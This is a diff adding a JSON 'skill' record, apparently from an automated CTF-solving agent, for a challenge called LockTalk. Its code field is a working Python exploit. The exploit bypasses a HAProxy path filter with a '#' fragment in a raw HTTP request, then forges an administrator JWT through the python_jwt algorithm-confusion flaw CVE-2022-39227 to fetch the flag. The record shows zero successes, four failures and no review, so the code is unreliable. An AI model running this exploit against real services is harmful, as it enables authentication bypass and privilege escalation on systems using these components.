@@ -1,0 +1,22 @@
+{
+  "id": "skill-jwt-82bf9f5bf10be3bd",
+  "success_count": 0,
+  "fail_count": 4,
+  "created": "2026-07-09T09:27:35Z",
+  "name": "locktalk_jwt_confusion",
+  "description": "适用于HAProxy前端过滤特定API路径，后端JWT验证存在算法混淆漏洞（CVE-2022-39227）的CTF题目",
+  "vuln_class": "jwt",
+  "signature": [
+    "algorithm_confusion",
+    "cve-2022-39227",
+    "fragment",
+    "haproxy_bypass",
+    "jwt",
+    "python_jwt"
+  ],
+  "code": "def solve(base_url, session):\n    import re\n    import json\n    import base64\n    import hashlib\n    \n    # Step 1: Bypass HAProxy ACL using fragment (#) in raw HTTP request via tcp()\n    # 动态获取ticket路径（从响应/提示中提取，此处假设为/api/v1/get_ticket）\n    # 注：实际题目中路径可能不同，但本题固定为/api/v1/get_ticket\n    ticket_path = '/api/v1/get_ticket'\n    \n    # 使用tcp发送原始HTTP请求，绕过HAProxy的path_beg检查\n    r = tcp()\n    r.send(f\"GET {ticket_path}# HTTP/1.1\\r\\nHost: localhost\\r\\nConnection: close\\r\\n\\r\\n\".encode())\n    response = r.recvall()\n    \n    # 解析响应获取ticket（动态提取JSON内容）\n    response_str = response.decode('utf-8', errors='ignore')\n    json_match = re.search(r'\\{.*\\}', response_str, re.DOTALL)\n    if not json_match:\n        return None\n    ticket_data = json.loads(json_match.group())\n    \n    # 动态提取ticket字段（常见字段名：ticket, token, jwt等）\n    guest_token = None\n    for key in ['ticket', 'token', 'jwt', 'access_token']:\n        if key in ticket_data:\n            guest_token = ticket_data[key]\n            break\n    # 特殊处理本题中的\"ticket: \"字段（带冒号空格）\n    if not guest_token:\n        for key in ticket_data:\n            if 'ticket' in key.lower():\n                guest_token = ticket_data[key]\n                break\n    if not guest_token:\n        return None\n    \n    # Step 2: JWT算法混淆攻击（CVE-2022-39227）\n    # 解析JWT的三个部分\n    parts = guest_token.split('.')\n    if len(parts) != 3:\n        return None\n    \n    header_b64, payload_b64, signature = parts\n    \n    # Base64解码辅助函数\n    def b64_decode(data):\n        padding = 4 - len(data) % 4\n        if padding != 4:\n            data += '=' * padding\n        return base64.urlsafe_b64decode(data)\n    \n    def b64_encode(data):\n        return base64.urlsafe_b64encode(data).rstrip(b'=').decode()\n    \n    # 解码payload，修改角色为管理员（常见字段：role, admin, is_admin等）\n    payload = json.loads(b64_decode(payload_b64))\n    \n    # 动态寻找并修改权限字段\n    admin_role_found = False\n    for admin_key in ['role', 'admin', 'is_admin', 'user_type', 'privilege']:\n        if admin_key in payload:\n            # 将值设置为管理员相关值\n            if isinstance(payload[admin_key], str):\n                payload[admin_key] = 'administrator'\n            elif isinstance(payload[admin_key], bool):\n                payload[admin_key] = True\n            elif isinstance(payload[admin_key], int):\n                payload[admin_key] = 1\n            admin_role_found = True\n            break\n    if not admin_role_found:\n        # 如果没找到已知权限字段，尝试添加role字段\n        payload['role'] = 'administrator'\n    \n    new_payload_b64 = b64_encode(json.dumps(payload, separators=(',', ':')).encode())\n    \n    # 构造恶意JWT，利用JSON解析差异绕过验证\n    # CVE-2022-39227: 将token包装成JSON对象，使python_jwt解析时忽略签名验证\n    crafted_token = f'{{\" \":{header_b64}.{new_payload_b64}.{signature},\"protected\":\"{header_b64}\",\"payload\":\"{payload_b64}\",\"signature\":\"{signature}\"}}'\n    \n    # Step 3: 获取flag（动态提取flag路径）\n    # 常见flag接口：/flag, /api/v1/flag, /get_flag等\n    flag_paths = ['/flag', '/api/v1/flag', '/get_flag', '/admin/flag']\n    for flag_path in flag_paths:\n        resp = http('GET', flag_path, headers={'Authorization': crafted_token})\n        if resp.status_code == 200:\n            body = resp.text\n            # 动态提取flag（常见flag格式）\n            flag_match = re.search(r'flag\\{[^}]+\\}', body, re.IGNORECASE)\n            if flag_match:\n                return flag_match.group()\n            # 也可能是其他格式\n            flag_match = re.search(r'[A-Za-z0-9]{32,}', body)\n            if flag_match:\n                return flag_match.group()\n            # 返回完整响应体以防flag直接显示\n            return body\n    \n    return None",
+  "provenance": {
+    "from": "http://127.0.0.1:1337",
+    "reviewed": false
+  }
+}
